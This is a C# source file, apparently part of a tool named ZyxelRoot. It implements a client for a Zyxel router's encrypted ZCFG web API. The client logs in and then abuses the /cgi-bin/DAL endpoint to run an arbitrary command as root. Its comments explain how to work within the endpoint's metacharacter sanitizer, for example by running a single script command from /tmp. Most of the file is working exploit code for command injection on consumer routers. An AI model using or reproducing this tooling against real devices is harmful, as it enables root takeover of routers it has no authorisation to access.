using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

namespace ZyxelRoot;

/// <summary>
/// ZCFG web API client: AES-encrypted JSON requests under an RSA-wrapped key.
/// Port of the <c>ZyxWeb</c> class from the original Python harness.
/// </summary>
/// <remarks>
/// Login is password-based against <c>/UserLogin</c>. The payload key is a
/// client-chosen 32-byte AES key — the protocol wraps it with RSA to the
/// router's public key (fetched live from <c>/getRSAPublickKey</c> on every
/// login), so any value works; it is not a secret, and the code simply uses
/// a 0x42 filler. The root-injection target (the DAL object id, the
/// command field, the command wrapping, and the payload template) comes from
/// the configuration. The device caps concurrent web logins ("Maxium number of
/// login account has reached"), so logins are retried with backoff and every
/// injection logs out afterwards.
/// </remarks>
public sealed class WebDalClient
{
    /// <summary>
    /// Client-chosen AES-256 key of the web protocol (0x42 x 32 filler). The
    /// protocol wraps it with RSA to the router on every login, so the value is
    /// not a secret and needs no configuration.
    /// </summary>
    private static readonly byte[] AesKey = Enumerable.Repeat((byte)0x42, 32).ToArray();

    /// <summary>Client-chosen IV of the web protocol (0x42 x 16 filler); not a secret.</summary>
    private static readonly byte[] AesIv = Enumerable.Repeat((byte)0x42, 16).ToArray();

    public WebDalClient(
        string host, string user, string password,
        string dalOid, string dalCommandField, string dalCommandWrap,
        Dictionary<string, JsonElement>? dalPayload)
    {
        Host = host;
        User = user;
        Password = password;
        DalOid = dalOid;
        DalCommandField = dalCommandField;
        DalCommandWrap = dalCommandWrap;
        DalPayload = dalPayload;
    }

    public string Host { get; }
    public string User { get; }
    public string Password { get; }

    /// <summary>DAL object id of the root-injection target (from the configuration).</summary>
    public string DalOid { get; }

    /// <summary>Payload field that carries the injected command (from the configuration).</summary>
    public string DalCommandField { get; }

    /// <summary>Format applied to the injected command; <c>{0}</c> is the command (from the configuration).</summary>
    public string DalCommandWrap { get; }

    /// <summary>
    /// Base payload template; the wrapped command is merged into it at runtime under
    /// <see cref="DalCommandField"/> (from the configuration).
    /// </summary>
    public Dictionary<string, JsonElement>? DalPayload { get; }

    /// <summary>Diagnostic sink (login retries, busy session pool, ...).</summary>
    public Action<string>? Log { get; set; }

    /// <summary>Login attempts before giving up (each may wait up to 30 s when busy).</summary>
    public int MaxLoginAttempts { get; set; } = 10;

    private string BaseUrl => $"http://{Host}";

    /// <summary>
    /// Executes <paramref name="command"/> as root through the configured DAL
    /// injection and always logs the web session out afterwards.
    /// </summary>
    /// <remarks>
    /// <paramref name="command"/> is wrapped per <see cref="DalCommandWrap"/> and
    /// placed into <see cref="DalCommandField"/>. The DAL sanitizer strips
    /// <c>; &gt; &lt; | &amp; "</c> from that line, so it must be a single
    /// metacharacter-free command such as <c>sh /tmp/script.sh</c>.
    /// </remarks>
    public async Task<DalResult> InjectAsync(string command, CancellationToken ct = default)
    {
        if (command.Contains('\n') || command.Contains('\r'))
            throw new ArgumentException("injected command must be a single line", nameof(command));
        if (string.IsNullOrEmpty(DalOid) || string.IsNullOrEmpty(DalCommandField) || string.IsNullOrEmpty(DalCommandWrap))
            throw new ZyxelRootException("the web injection is not configured (Zyxel:DalOid, Zyxel:DalCommandField, Zyxel:DalCommandWrap)");
        if (DalPayload is null || DalPayload.Count == 0)
            throw new ZyxelRootException("the web injection payload template (Zyxel:DalPayload) is not configured");

        using var handler = new SocketsHttpHandler
        {
            UseProxy = false,
            CookieContainer = new CookieContainer(),
            ConnectTimeout = TimeSpan.FromSeconds(10),
            PooledConnectionLifetime = TimeSpan.FromMinutes(1)
        };
        using var http = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(20) };

        string sessionKey = await LoginAsync(http, ct).ConfigureAwait(false);

        try
        {
            var payload = new Dictionary<string, JsonElement>(StringComparer.Ordinal);
            foreach (KeyValuePair<string, JsonElement> entry in DalPayload!)
                payload[entry.Key] = entry.Value;
            payload[DalCommandField] = JsonSerializer.SerializeToElement(string.Format(DalCommandWrap, command));

            string body = JsonSerializer.Serialize(Encrypt(payload, ""));
            string url = $"{BaseUrl}/cgi-bin/DAL?oid={Uri.EscapeDataString(DalOid)}&sessionkey={Uri.EscapeDataString(sessionKey)}";

            using var request = new HttpRequestMessage(HttpMethod.Post, url)
            {
                Content = new ByteArrayContent(Encoding.ASCII.GetBytes(body))
            };

            using HttpResponseMessage response = await http.SendAsync(request, ct).ConfigureAwait(false);
            string raw = await response.Content.ReadAsStringAsync(ct).ConfigureAwait(false);

            string decrypted;
            string? result = null;
            string? reply = null;

            try
            {
                using var doc = JsonDocument.Parse(raw);
                JsonElement element = DecryptElement(doc.RootElement);
                decrypted = element.GetRawText();
                if (element.ValueKind == JsonValueKind.Object)
                {
                    if (element.TryGetProperty("result", out var r) && r.ValueKind == JsonValueKind.String)
                        result = r.GetString();
                    if (element.TryGetProperty("ReplyMsg", out var m) && m.ValueKind == JsonValueKind.String)
                        reply = m.GetString();
                }
            }
            catch
            {
                decrypted = raw;
            }

            return new DalResult((int)response.StatusCode, decrypted, result, reply, sessionKey);
        }
        finally
        {
            await LogoutAsync(http, sessionKey).ConfigureAwait(false);
        }
    }

    private async Task<string> LoginAsync(HttpClient http, CancellationToken ct)
    {
        string pem;
        try
        {
            string json = await http.GetStringAsync($"{BaseUrl}/getRSAPublickKey", ct).ConfigureAwait(false);
            using var doc = JsonDocument.Parse(json);
            pem = doc.RootElement.GetProperty("RSAPublicKey").GetString()
                  ?? throw new ZyxelRootException("empty RSAPublicKey");
        }
        catch (Exception ex) when (ex is not ZyxelRootException)
        {
            throw new ZyxelRootException($"could not fetch the web UI RSA key: {ex.Message}", ex);
        }

        string encryptedKey;
        try
        {
            using var rsa = RSA.Create();
            rsa.ImportFromPem(pem);
            byte[] inner = Encoding.ASCII.GetBytes(Convert.ToBase64String(AesKey));
            encryptedKey = Convert.ToBase64String(rsa.Encrypt(inner, RSAEncryptionPadding.Pkcs1));
        }
        catch (Exception ex)
        {
            throw new ZyxelRootException($"could not wrap the web payload key: {ex.Message}", ex);
        }

        var login = new Dictionary<string, object?>
        {
            ["Input_Account"] = User,
            ["Input_Passwd"] = Convert.ToBase64String(Encoding.UTF8.GetBytes(Password)),
            ["RememberPassword"] = 0,
            ["SHA512_password"] = false
        };

        string loginBody = JsonSerializer.Serialize(Encrypt(login, encryptedKey));
        string? last = null;

        for (int attempt = 0; attempt < MaxLoginAttempts; attempt++)
        {
            ct.ThrowIfCancellationRequested();

            string text;
            int status;
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Post, $"{BaseUrl}/UserLogin")
                {
                    Content = new ByteArrayContent(Encoding.ASCII.GetBytes(loginBody))
                };
                using HttpResponseMessage response = await http.SendAsync(request, ct).ConfigureAwait(false);
                status = (int)response.StatusCode;
                text = await response.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
            }
            catch (Exception ex) when (ex is not OperationCanceledException)
            {
                last = ex.Message;
                Log?.Invoke($"web login attempt {attempt + 1} transport error: {ex.Message}");
                await Task.Delay(TimeSpan.FromSeconds(2 + attempt * 2), ct).ConfigureAwait(false);
                continue;
            }

            string decrypted;
            string? result = null;
            string? sessionKey = null;

            try
            {
                using var doc = JsonDocument.Parse(text);
                JsonElement element = DecryptElement(doc.RootElement);
                decrypted = element.GetRawText();
                if (element.ValueKind == JsonValueKind.Object)
                {
                    if (element.TryGetProperty("result", out var r) && r.ValueKind == JsonValueKind.String)
                        result = r.GetString();

                    // The device returns the session key as a bare JSON number
                    // (e.g. {"sessionkey":324936641373915,...}); Python's untyped
                    // dict never noticed. Accept both shapes.
                    if (element.TryGetProperty("sessionkey", out var k))
                    {
                        sessionKey = k.ValueKind switch
                        {
                            JsonValueKind.String => k.GetString(),
                            JsonValueKind.Number => k.GetRawText(),
                            _ => null
                        };
                    }
                }
            }
            catch
            {
                decrypted = text;
            }

            if (result == "ZCFG_SUCCESS")
            {
                if (!string.IsNullOrEmpty(sessionKey))
                    return sessionKey;

                // Success but no usable key: retrying only leaks more sessions.
                throw new ZyxelRootException($"web login reported ZCFG_SUCCESS without a usable sessionkey: {decrypted}");
            }

            last = $"HTTP {status} {decrypted}";

            bool busy = decrypted.Contains("login account", StringComparison.OrdinalIgnoreCase);
            int waitSeconds = busy ? 30 : 2 + attempt * 2;

            Log?.Invoke($"web login attempt {attempt + 1} failed: {last}" +
                        (busy ? " (session pool busy, waiting...)" : ""));

            await Task.Delay(TimeSpan.FromSeconds(waitSeconds), ct).ConfigureAwait(false);
        }

        throw new ZyxelRootException($"web login failed after {MaxLoginAttempts} attempts: {last}");
    }

    private async Task LogoutAsync(HttpClient http, string sessionKey)
    {
        try
        {
            string body = JsonSerializer.Serialize(Encrypt(new Dictionary<string, object?>(), ""));
            using var request = new HttpRequestMessage(HttpMethod.Post, $"{BaseUrl}/cgi-bin/UserLogout")
            {
                Content = new ByteArrayContent(Encoding.ASCII.GetBytes(body))
            };
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
            using HttpResponseMessage response = await http.SendAsync(request, cts.Token).ConfigureAwait(false);
            await response.Content.ReadAsStringAsync(cts.Token).ConfigureAwait(false);
        }
        catch
        {
            // The session expires on its own; logout failure must not mask the injection result.
        }
    }

    /// <summary>Encrypts a JSON payload with the client-chosen AES key and the given RSA-wrapped key.</summary>
    public static Dictionary<string, string> Encrypt(object payload, string key)
    {
        string json = JsonSerializer.Serialize(payload);

        using var aes = Aes.Create();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = AesKey;
        aes.IV = AesIv;

        using var encryptor = aes.CreateEncryptor();
        byte[] plain = Encoding.ASCII.GetBytes(json);
        byte[] cipher = encryptor.TransformFinalBlock(plain, 0, plain.Length);

        return new Dictionary<string, string>
        {
            ["content"] = Convert.ToBase64String(cipher),
            ["iv"] = Convert.ToBase64String(AesIv),
            ["key"] = key
        };
    }

    private static byte[] DecryptBytes(byte[] cipher, byte[] iv)
    {
        using var aes = Aes.Create();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = AesKey;
        aes.IV = iv.Length >= 16 ? iv[..16] : iv;

        using var decryptor = aes.CreateDecryptor();
        return decryptor.TransformFinalBlock(cipher, 0, cipher.Length);
    }

    /// <summary>Decrypts a ZCFG response element, or returns it unchanged.</summary>
    private static JsonElement DecryptElement(JsonElement root)
    {
        if (root.ValueKind != JsonValueKind.Object ||
            !root.TryGetProperty("iv", out var ivElement) ||
            !root.TryGetProperty("content", out var contentElement) ||
            ivElement.ValueKind != JsonValueKind.String ||
            contentElement.ValueKind != JsonValueKind.String)
        {
            return root.Clone();
        }

        byte[] iv = Convert.FromBase64String(ivElement.GetString()!);
        byte[] cipher = Convert.FromBase64String(contentElement.GetString()!);
        byte[] plain = DecryptBytes(cipher, iv);

        using var doc = JsonDocument.Parse(plain);
        return doc.RootElement.Clone();
    }
}
